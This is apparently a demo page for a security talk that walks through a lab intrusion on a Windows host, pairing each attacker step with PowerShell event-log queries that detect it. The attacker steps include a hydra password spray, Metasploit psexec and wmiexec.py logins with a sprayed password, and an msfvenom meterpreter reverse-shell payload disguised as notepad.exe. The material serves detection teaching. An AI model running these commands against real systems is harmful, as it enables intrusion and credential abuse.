# Demo

## Attacker launches password spray

### Attacker

Password spray: `hydra -L users.txt -P seasons-2023.txt 192.168.37.237 smb -u`

<img width="774" alt="hydra" src="https://github.com/eric-conrad/c2-talk/assets/14989334/5889e132-8050-4136-a7a2-90c7fe344872">

### Defender 

Count successful (4624) and failed (4625) logins:

`Get-WinEvent -Path C:\labs\valkyrie-security-logons.evtx | Group-Object id -NoElement | sort count`

## Attacker uses sprayed credentials to attempt to log in via Metasplot's psexec

### Attacker

```
msfconsole
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 192.168.37.237
msf6 > set SMBUser fgaeta
msf6 > set SMBPass W1nter2023!
msf6 > exploit
```

<img width="540" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/33b73450-2f72-4154-adb8-e4df73605205">

### Defender

Service was created (before Defender killed it):

`Get-WinEvent @{Path="C:\labs\valkyrie-system.evtx"; ID=7045}| fl`

Command was executed (event 4688):

`Get-WinEvent @{Path="C:\labs\valkyrie-security.evtx";id=4688}| Where {$_.Message -like "*powershell.exe -nop*"} | fl`

Windows Defender Antivirus killed the connection:

`Get-WinEvent @{Path="C:\labs\valkyrie-defender.evtx";id=1117} | fl`

## Attacker logs in with wmiexec.py:

### Attacker
`wmiexec.py fgaeta:W1nter2023\!@192.168.37.237`

<img width="558" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/8d7f5896-91be-41d1-9b31-ac312b38ddd4">

### Defender

Microsoft Defender Antivirus: zero logs.

Sysmon event 1 (and security event 4688) shows `WmiPrvSE.exe` launching `cmd.exe` and redirecting to the `ADMIN$` share:

`Get-WinEvent @{Path="C:\labs\valkyrie-sysmon.evtx";id=1} | Where {$_.Message -like "*ADMIN$*"}|fl`




## Attacker creates plan.exe with msfvenom:

### Attacker

`msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.37.203 LPORT=8080 -x notepad.exe -f exe > plan.exe`

Attacker uploads `plan.exe` via wmiexex.py's `lput`, tries to run it, and fails:

<img width="495" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/4fd06aff-b3eb-4104-9fb8-20f0b9436408">

### Defender

The command executed:

`Get-WinEvent @{Path="C:\labs\valkyrie-sysmon.evtx";id=1} | Where {$_.Message -like "*Image: C:\Users\fgaeta\plan.exe*"} | fl`

Then Windows Defender killed it:

`Get-WinEvent @{Path="C:\labs\valkyrie-defender.evtx";id=1116} | Where {$_.Message -like "*plan.exe*"} | fl | more`

## Attacker uses xor encoding and re-uploads plan.exe






**Long tail analysis**: `Get-WinEvent -Path C:\labs\valkyrie-security.evtx | Group-Object id -NoElement | sort count`

**Service creation events**: `Get-WinEvent @{Path="C:\labs\valkyrie-system.evtx"; ID=7045} | fl | more`

**Search for 'powershell -nop'**: `Get-WinEvent @{Path="C:\labs\valkyrie-security.evtx";id=4688}| Where {$_.Message -like "*powershell.exe -nop*"} | fl | more`

**Search for ADMIN\$**: `Get-WinEvent @{Path="C:\labs\valkyrie-security.evtx";id=4688}| Where {$_.Message -like "*ADMIN$*"} | fl`

**Search for 'plan.exe'**: `Get-WinEvent @{Path="C:\labs\valkyrie-sysmon.evtx";} | Where {$_.Message -like "*plan.exe*"} | fl`

**Search for 'Remote Desktop'**: `Get-WinEvent @{Path="C:\labs\valkyrie-system.evtx";id=7040} | Where {$_.Message -like "*Remote Desktop*"} | fl`

**Search for self-signed certificates** `Get-WinEvent @{Path="C:\labs\valkyrie-system.evtx";id=1056} | fl`

**Account creation (on the domain controller)**: `Get-WinEvent @{Path="\labs\pegasus-security.evtx"; id=4720} | fl`

**Account added to the domain admin group**: `Get-WinEvent @{Path="\labs\\pegasus-security.evtx"; id=4737} | fl`

**Windows Defender**: `Get-WinEvent @{Path="C:\labs\valkyrie-defender.evtx";id=1117} | fl | more`
